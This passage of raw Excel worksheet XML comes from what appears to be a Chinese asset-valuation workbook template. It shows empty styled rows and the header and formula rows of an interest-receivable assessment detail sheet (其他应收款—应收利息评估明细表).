    <row r="50" s="415">
      <c r="B50" s="347" t="n"/>
      <c r="C50" s="347" t="n"/>
      <c r="D50" s="347" t="n"/>
      <c r="E50" s="347" t="n"/>
      <c r="F50" s="347" t="n"/>
      <c r="G50" s="347" t="n"/>
      <c r="H50" s="347" t="n"/>
      <c r="I50" s="347" t="n"/>
      <c r="J50" s="347" t="n"/>
      <c r="K50" s="347" t="n"/>
      <c r="L50" s="347" t="n"/>
      <c r="M50" s="347" t="n"/>
      <c r="N50" s="322" t="n"/>
    </row>
    <row r="51" s="415">
      <c r="B51" s="347" t="n"/>
      <c r="C51" s="347" t="n"/>
      <c r="D51" s="347" t="n"/>
      <c r="E51" s="347" t="n"/>
      <c r="F51" s="347" t="n"/>
      <c r="G51" s="347" t="n"/>
      <c r="H51" s="347" t="n"/>
      <c r="I51" s="347" t="n"/>
      <c r="J51" s="347" t="n"/>
      <c r="K51" s="347" t="n"/>
      <c r="L51" s="347" t="n"/>
      <c r="M51" s="347" t="n"/>
      <c r="N51" s="322" t="n"/>
    </row>
    <row r="52" s="415">
      <c r="B52" s="347" t="n"/>
      <c r="C52" s="347" t="n"/>
      <c r="D52" s="347" t="n"/>
      <c r="E52" s="347" t="n"/>
      <c r="F52" s="347" t="n"/>
      <c r="G52" s="347" t="n"/>
      <c r="H52" s="347" t="n"/>
      <c r="I52" s="347" t="n"/>
      <c r="J52" s="347" t="n"/>
      <c r="K52" s="347" t="n"/>
      <c r="L52" s="347" t="n"/>
      <c r="M52" s="347" t="n"/>
      <c r="N52" s="322" t="n"/>
    </row>
    <row r="53" s="415">
      <c r="B53" s="347" t="n"/>
      <c r="C53" s="347" t="n"/>
      <c r="D53" s="347" t="n"/>
      <c r="E53" s="347" t="n"/>
      <c r="F53" s="347" t="n"/>
      <c r="G53" s="347" t="n"/>
      <c r="H53" s="347" t="n"/>
      <c r="I53" s="347" t="n"/>
      <c r="J53" s="347" t="n"/>
      <c r="K53" s="347" t="n"/>
      <c r="L53" s="347" t="n"/>
      <c r="M53" s="347" t="n"/>
      <c r="N53" s="322" t="n"/>
    </row>
    <row r="54" s="415">
      <c r="B54" s="347" t="n"/>
      <c r="C54" s="347" t="n"/>
      <c r="D54" s="347" t="n"/>
      <c r="E54" s="347" t="n"/>
      <c r="F54" s="347" t="n"/>
      <c r="G54" s="347" t="n"/>
      <c r="H54" s="347" t="n"/>
      <c r="I54" s="347" t="n"/>
      <c r="J54" s="347" t="n"/>
      <c r="K54" s="347" t="n"/>
      <c r="L54" s="347" t="n"/>
      <c r="M54" s="347" t="n"/>
      <c r="N54" s="322" t="n"/>
    </row>
    <row r="55" s="415">
      <c r="B55" s="347" t="n"/>
      <c r="C55" s="347" t="n"/>
      <c r="D55" s="347" t="n"/>
      <c r="E55" s="347" t="n"/>
      <c r="F55" s="347" t="n"/>
      <c r="G55" s="347" t="n"/>
      <c r="H55" s="347" t="n"/>
      <c r="I55" s="347" t="n"/>
      <c r="J55" s="347" t="n"/>
      <c r="K55" s="347" t="n"/>
      <c r="L55" s="347" t="n"/>
      <c r="M55" s="347" t="n"/>
      <c r="N55" s="322" t="n"/>
    </row>
    <row r="56" s="415">
      <c r="B56" s="347" t="n"/>
      <c r="C56" s="347" t="n"/>
      <c r="D56" s="347" t="n"/>
      <c r="E56" s="347" t="n"/>
      <c r="F56" s="347" t="n"/>
      <c r="G56" s="347" t="n"/>
      <c r="H56" s="347" t="n"/>
      <c r="I56" s="347" t="n"/>
      <c r="J56" s="347" t="n"/>
      <c r="K56" s="347" t="n"/>
      <c r="L56" s="347" t="n"/>
      <c r="M56" s="347" t="n"/>
      <c r="N56" s="322" t="n"/>
    </row>
    <row r="57" s="415">
      <c r="B57" s="347" t="n"/>
      <c r="C57" s="347" t="n"/>
      <c r="D57" s="347" t="n"/>
      <c r="E57" s="347" t="n"/>
      <c r="F57" s="347" t="n"/>
      <c r="G57" s="347" t="n"/>
      <c r="H57" s="347" t="n"/>
      <c r="I57" s="347" t="n"/>
      <c r="J57" s="347" t="n"/>
      <c r="K57" s="347" t="n"/>
      <c r="L57" s="347" t="n"/>
      <c r="M57" s="347" t="n"/>
      <c r="N57" s="322" t="n"/>
    </row>
    <row r="58" s="415">
      <c r="B58" s="347" t="n"/>
      <c r="C58" s="347" t="n"/>
      <c r="D58" s="347" t="n"/>
      <c r="E58" s="347" t="n"/>
      <c r="F58" s="347" t="n"/>
      <c r="G58" s="347" t="n"/>
      <c r="H58" s="347" t="n"/>
      <c r="I58" s="347" t="n"/>
      <c r="J58" s="347" t="n"/>
      <c r="K58" s="347" t="n"/>
      <c r="L58" s="347" t="n"/>
      <c r="M58" s="347" t="n"/>
      <c r="N58" s="322" t="n"/>
    </row>
    <row r="59" s="415">
      <c r="B59" s="347" t="n"/>
      <c r="C59" s="347" t="n"/>
      <c r="D59" s="347" t="n"/>
      <c r="E59" s="347" t="n"/>
      <c r="F59" s="347" t="n"/>
      <c r="G59" s="347" t="n"/>
      <c r="H59" s="347" t="n"/>
      <c r="I59" s="347" t="n"/>
      <c r="J59" s="347" t="n"/>
      <c r="K59" s="347" t="n"/>
      <c r="L59" s="347" t="n"/>
      <c r="M59" s="347" t="n"/>
      <c r="N59" s="322" t="n"/>
    </row>
    <row r="60" s="415">
      <c r="B60" s="347" t="n"/>
      <c r="C60" s="347" t="n"/>
      <c r="D60" s="347" t="n"/>
      <c r="E60" s="347" t="n"/>
      <c r="F60" s="347" t="n"/>
      <c r="G60" s="347" t="n"/>
      <c r="H60" s="347" t="n"/>
      <c r="I60" s="347" t="n"/>
      <c r="J60" s="347" t="n"/>
      <c r="K60" s="347" t="n"/>
      <c r="L60" s="347" t="n"/>
      <c r="M60" s="347" t="n"/>
      <c r="N60" s="322" t="n"/>
    </row>
    <row r="61" s="415">
      <c r="B61" s="347" t="n"/>
      <c r="C61" s="347" t="n"/>
      <c r="D61" s="347" t="n"/>
      <c r="E61" s="347" t="n"/>
      <c r="F61" s="347" t="n"/>
      <c r="G61" s="347" t="n"/>
      <c r="H61" s="347" t="n"/>
      <c r="I61" s="347" t="n"/>
      <c r="J61" s="347" t="n"/>
      <c r="K61" s="347" t="n"/>
      <c r="L61" s="347" t="n"/>
      <c r="M61" s="347" t="n"/>
      <c r="N61" s="322" t="n"/>
    </row>
    <row r="62" s="415">
      <c r="B62" s="347" t="n"/>
      <c r="C62" s="347" t="n"/>
      <c r="D62" s="347" t="n"/>
      <c r="E62" s="347" t="n"/>
      <c r="F62" s="347" t="n"/>
      <c r="G62" s="347" t="n"/>
      <c r="H62" s="347" t="n"/>
      <c r="I62" s="347" t="n"/>
      <c r="J62" s="347" t="n"/>
      <c r="K62" s="347" t="n"/>
      <c r="L62" s="347" t="n"/>
      <c r="M62" s="347" t="n"/>
      <c r="N62" s="322" t="n"/>
    </row>
    <row r="63" s="415">
      <c r="B63" s="347" t="n"/>
      <c r="C63" s="347" t="n"/>
      <c r="D63" s="347" t="n"/>
      <c r="E63" s="347" t="n"/>
      <c r="F63" s="347" t="n"/>
      <c r="G63" s="347" t="n"/>
      <c r="H63" s="347" t="n"/>
      <c r="I63" s="347" t="n"/>
      <c r="J63" s="347" t="n"/>
      <c r="K63" s="347" t="n"/>
      <c r="L63" s="347" t="n"/>
      <c r="M63" s="347" t="n"/>
      <c r="N63" s="322" t="n"/>
    </row>
    <row r="64" s="415">
      <c r="B64" s="347" t="n"/>
      <c r="C64" s="347" t="n"/>
      <c r="D64" s="347" t="n"/>
      <c r="E64" s="347" t="n"/>
      <c r="F64" s="347" t="n"/>
      <c r="G64" s="347" t="n"/>
      <c r="H64" s="347" t="n"/>
      <c r="I64" s="347" t="n"/>
      <c r="J64" s="347" t="n"/>
      <c r="K64" s="347" t="n"/>
      <c r="L64" s="347" t="n"/>
      <c r="M64" s="347" t="n"/>
      <c r="N64" s="322" t="n"/>
    </row>
    <row r="65" s="415">
      <c r="B65" s="347" t="n"/>
      <c r="C65" s="347" t="n"/>
      <c r="D65" s="347" t="n"/>
      <c r="E65" s="347" t="n"/>
      <c r="F65" s="347" t="n"/>
      <c r="G65" s="347" t="n"/>
      <c r="H65" s="347" t="n"/>
      <c r="I65" s="347" t="n"/>
      <c r="J65" s="347" t="n"/>
      <c r="K65" s="347" t="n"/>
      <c r="L65" s="347" t="n"/>
      <c r="M65" s="347" t="n"/>
      <c r="N65" s="322" t="n"/>
    </row>
    <row r="66" s="415">
      <c r="B66" s="347" t="n"/>
      <c r="C66" s="347" t="n"/>
      <c r="D66" s="347" t="n"/>
      <c r="E66" s="347" t="n"/>
      <c r="F66" s="347" t="n"/>
      <c r="G66" s="347" t="n"/>
      <c r="H66" s="347" t="n"/>
      <c r="I66" s="347" t="n"/>
      <c r="J66" s="347" t="n"/>
      <c r="K66" s="347" t="n"/>
      <c r="L66" s="347" t="n"/>
      <c r="M66" s="347" t="n"/>
      <c r="N66" s="322" t="n"/>
    </row>
    <row r="67" s="415">
      <c r="B67" s="347" t="n"/>
      <c r="C67" s="347" t="n"/>
      <c r="D67" s="347" t="n"/>
      <c r="E67" s="347" t="n"/>
      <c r="F67" s="347" t="n"/>
      <c r="G67" s="347" t="n"/>
      <c r="H67" s="347" t="n"/>
      <c r="I67" s="347" t="n"/>
      <c r="J67" s="347" t="n"/>
      <c r="K67" s="347" t="n"/>
      <c r="L67" s="347" t="n"/>
      <c r="M67" s="347" t="n"/>
      <c r="N67" s="322" t="n"/>
    </row>
    <row r="68" s="415">
      <c r="B68" s="347" t="n"/>
      <c r="C68" s="347" t="n"/>
      <c r="D68" s="347" t="n"/>
      <c r="E68" s="347" t="n"/>
      <c r="F68" s="347" t="n"/>
      <c r="G68" s="347" t="n"/>
      <c r="H68" s="347" t="n"/>
      <c r="I68" s="347" t="n"/>
      <c r="J68" s="347" t="n"/>
      <c r="K68" s="347" t="n"/>
      <c r="L68" s="347" t="n"/>
      <c r="M68" s="347" t="n"/>
      <c r="N68" s="322" t="n"/>
    </row>
    <row r="69" s="415">
      <c r="B69" s="347" t="n"/>
      <c r="C69" s="347" t="n"/>
      <c r="D69" s="347" t="n"/>
      <c r="E69" s="347" t="n"/>
      <c r="F69" s="347" t="n"/>
      <c r="G69" s="347" t="n"/>
      <c r="H69" s="347" t="n"/>
      <c r="I69" s="347" t="n"/>
      <c r="J69" s="347" t="n"/>
      <c r="K69" s="347" t="n"/>
      <c r="L69" s="347" t="n"/>
      <c r="M69" s="347" t="n"/>
      <c r="N69" s="322" t="n"/>
    </row>
    <row r="70" s="415">
      <c r="B70" s="347" t="n"/>
      <c r="C70" s="347" t="n"/>
      <c r="D70" s="347" t="n"/>
      <c r="E70" s="347" t="n"/>
      <c r="F70" s="347" t="n"/>
      <c r="G70" s="347" t="n"/>
      <c r="H70" s="347" t="n"/>
      <c r="I70" s="347" t="n"/>
      <c r="J70" s="347" t="n"/>
      <c r="K70" s="347" t="n"/>
      <c r="L70" s="347" t="n"/>
      <c r="M70" s="347" t="n"/>
      <c r="N70" s="322" t="n"/>
    </row>
    <row r="71" s="415">
      <c r="B71" s="341" t="n"/>
      <c r="C71" s="341" t="n"/>
      <c r="D71" s="341" t="n"/>
      <c r="E71" s="341" t="n"/>
      <c r="F71" s="341" t="n"/>
      <c r="G71" s="341" t="n"/>
      <c r="H71" s="341" t="n"/>
      <c r="I71" s="341" t="n"/>
      <c r="J71" s="341" t="n"/>
      <c r="K71" s="341" t="n"/>
      <c r="L71" s="341" t="n"/>
      <c r="M71" s="341" t="n"/>
      <c r="N71" s="322" t="n"/>
    </row>
    <row r="72" s="415">
      <c r="B72" s="341" t="n"/>
      <c r="C72" s="341" t="n"/>
      <c r="D72" s="341" t="n"/>
      <c r="E72" s="341" t="n"/>
      <c r="F72" s="341" t="n"/>
      <c r="G72" s="341" t="n"/>
      <c r="H72" s="341" t="n"/>
      <c r="I72" s="341" t="n"/>
      <c r="J72" s="341" t="n"/>
      <c r="K72" s="341" t="n"/>
      <c r="L72" s="341" t="n"/>
      <c r="M72" s="341" t="n"/>
      <c r="N72" s="322" t="n"/>
    </row>
    <row r="73" s="415">
      <c r="B73" s="341" t="n"/>
      <c r="C73" s="341" t="n"/>
      <c r="D73" s="341" t="n"/>
      <c r="E73" s="341" t="n"/>
      <c r="F73" s="341" t="n"/>
      <c r="G73" s="341" t="n"/>
      <c r="H73" s="341" t="n"/>
      <c r="I73" s="341" t="n"/>
      <c r="J73" s="341" t="n"/>
      <c r="K73" s="341" t="n"/>
      <c r="L73" s="341" t="n"/>
      <c r="M73" s="341" t="n"/>
      <c r="N73" s="322" t="n"/>
    </row>
    <row r="74" s="415">
      <c r="B74" s="341" t="n"/>
      <c r="C74" s="341" t="n"/>
      <c r="D74" s="341" t="n"/>
      <c r="E74" s="341" t="n"/>
      <c r="F74" s="341" t="n"/>
      <c r="G74" s="341" t="n"/>
      <c r="H74" s="341" t="n"/>
      <c r="I74" s="341" t="n"/>
      <c r="J74" s="341" t="n"/>
      <c r="K74" s="341" t="n"/>
      <c r="L74" s="341" t="n"/>
      <c r="M74" s="341" t="n"/>
      <c r="N74" s="322" t="n"/>
    </row>
    <row r="75" s="415">
      <c r="B75" s="341" t="n"/>
      <c r="C75" s="341" t="n"/>
      <c r="D75" s="341" t="n"/>
      <c r="E75" s="341" t="n"/>
      <c r="F75" s="341" t="n"/>
      <c r="G75" s="341" t="n"/>
      <c r="H75" s="341" t="n"/>
      <c r="I75" s="341" t="n"/>
      <c r="J75" s="341" t="n"/>
      <c r="K75" s="341" t="n"/>
      <c r="L75" s="341" t="n"/>
      <c r="M75" s="341" t="n"/>
      <c r="N75" s="322" t="n"/>
    </row>
    <row r="76" s="415">
      <c r="B76" s="342" t="n"/>
      <c r="C76" s="342" t="n"/>
      <c r="D76" s="342" t="n"/>
      <c r="E76" s="342" t="n"/>
      <c r="F76" s="342" t="n"/>
      <c r="G76" s="342" t="n"/>
      <c r="H76" s="342" t="n"/>
      <c r="I76" s="342" t="n"/>
      <c r="J76" s="342" t="n"/>
      <c r="K76" s="342" t="n"/>
      <c r="L76" s="342" t="n"/>
      <c r="M76" s="342" t="n"/>
    </row>
    <row r="77" s="415">
      <c r="B77" s="342" t="n"/>
      <c r="C77" s="342" t="n"/>
      <c r="D77" s="342" t="n"/>
      <c r="E77" s="342" t="n"/>
      <c r="F77" s="342" t="n"/>
      <c r="G77" s="342" t="n"/>
      <c r="H77" s="342" t="n"/>
      <c r="I77" s="342" t="n"/>
      <c r="J77" s="342" t="n"/>
      <c r="K77" s="342" t="n"/>
      <c r="L77" s="342" t="n"/>
      <c r="M77" s="342" t="n"/>
    </row>
    <row r="78" s="415">
      <c r="B78" s="342" t="n"/>
      <c r="C78" s="342" t="n"/>
      <c r="D78" s="342" t="n"/>
      <c r="E78" s="342" t="n"/>
      <c r="F78" s="342" t="n"/>
      <c r="G78" s="342" t="n"/>
      <c r="H78" s="342" t="n"/>
      <c r="I78" s="342" t="n"/>
      <c r="J78" s="342" t="n"/>
      <c r="K78" s="342" t="n"/>
      <c r="L78" s="342" t="n"/>
      <c r="M78" s="342" t="n"/>
    </row>
    <row r="79" s="415">
      <c r="B79" s="342" t="n"/>
      <c r="C79" s="342" t="n"/>
      <c r="D79" s="342" t="n"/>
      <c r="E79" s="342" t="n"/>
      <c r="F79" s="342" t="n"/>
      <c r="G79" s="342" t="n"/>
      <c r="H79" s="342" t="n"/>
      <c r="I79" s="342" t="n"/>
      <c r="J79" s="342" t="n"/>
      <c r="K79" s="342" t="n"/>
      <c r="L79" s="342" t="n"/>
      <c r="M79" s="342" t="n"/>
    </row>
    <row r="80" s="415">
      <c r="B80" s="342" t="n"/>
      <c r="C80" s="342" t="n"/>
      <c r="D80" s="342" t="n"/>
      <c r="E80" s="342" t="n"/>
      <c r="F80" s="342" t="n"/>
      <c r="G80" s="342" t="n"/>
      <c r="H80" s="342" t="n"/>
      <c r="I80" s="342" t="n"/>
      <c r="J80" s="342" t="n"/>
      <c r="K80" s="342" t="n"/>
      <c r="L80" s="342" t="n"/>
      <c r="M80" s="342" t="n"/>
    </row>
    <row r="81" s="415">
      <c r="B81" s="342" t="n"/>
      <c r="C81" s="342" t="n"/>
      <c r="D81" s="342" t="n"/>
      <c r="E81" s="342" t="n"/>
      <c r="F81" s="342" t="n"/>
      <c r="G81" s="342" t="n"/>
      <c r="H81" s="342" t="n"/>
      <c r="I81" s="342" t="n"/>
      <c r="J81" s="342" t="n"/>
      <c r="K81" s="342" t="n"/>
      <c r="L81" s="342" t="n"/>
      <c r="M81" s="342" t="n"/>
    </row>
    <row r="82" s="415">
      <c r="B82" s="342" t="n"/>
      <c r="C82" s="342" t="n"/>
      <c r="D82" s="342" t="n"/>
      <c r="E82" s="342" t="n"/>
      <c r="F82" s="342" t="n"/>
      <c r="G82" s="342" t="n"/>
      <c r="H82" s="342" t="n"/>
      <c r="I82" s="342" t="n"/>
      <c r="J82" s="342" t="n"/>
      <c r="K82" s="342" t="n"/>
      <c r="L82" s="342" t="n"/>
      <c r="M82" s="342" t="n"/>
    </row>
    <row r="83" s="415">
      <c r="B83" s="342" t="n"/>
      <c r="C83" s="342" t="n"/>
      <c r="D83" s="342" t="n"/>
      <c r="E83" s="342" t="n"/>
      <c r="F83" s="342" t="n"/>
      <c r="G83" s="342" t="n"/>
      <c r="H83" s="342" t="n"/>
      <c r="I83" s="342" t="n"/>
      <c r="J83" s="342" t="n"/>
      <c r="K83" s="342" t="n"/>
      <c r="L83" s="342" t="n"/>
      <c r="M83" s="342" t="n"/>
    </row>
    <row r="84" s="415">
      <c r="B84" s="342" t="n"/>
      <c r="C84" s="342" t="n"/>
      <c r="D84" s="342" t="n"/>
      <c r="E84" s="342" t="n"/>
      <c r="F84" s="342" t="n"/>
      <c r="G84" s="342" t="n"/>
      <c r="H84" s="342" t="n"/>
      <c r="I84" s="342" t="n"/>
      <c r="J84" s="342" t="n"/>
      <c r="K84" s="342" t="n"/>
      <c r="L84" s="342" t="n"/>
      <c r="M84" s="342" t="n"/>
    </row>
    <row r="85" s="415">
      <c r="B85" s="342" t="n"/>
      <c r="C85" s="342" t="n"/>
      <c r="D85" s="342" t="n"/>
      <c r="E85" s="342" t="n"/>
      <c r="F85" s="342" t="n"/>
      <c r="G85" s="342" t="n"/>
      <c r="H85" s="342" t="n"/>
      <c r="I85" s="342" t="n"/>
      <c r="J85" s="342" t="n"/>
      <c r="K85" s="342" t="n"/>
      <c r="L85" s="342" t="n"/>
      <c r="M85" s="342" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="F26:H26"/>
    <mergeCell ref="B2:H2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24.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet24">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="22.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="11" customWidth="1" style="410" min="5" max="5"/>
    <col width="17.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="9" customWidth="1" style="410" min="12" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>其他应收款—应收利息评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'3-8其他应收款汇总'!B2:H2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402" t="inlineStr">
        <is>
          <t>表3-8-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="549">
        <f>'3-8其他应收款汇总'!B4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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17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欠款单位名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>本金</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>利息所属期间</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>年利息率%</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="565" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="565" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="565" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="565" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="565" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="565" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="565" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="565" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="565" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="565" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="565" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="565" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="565" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
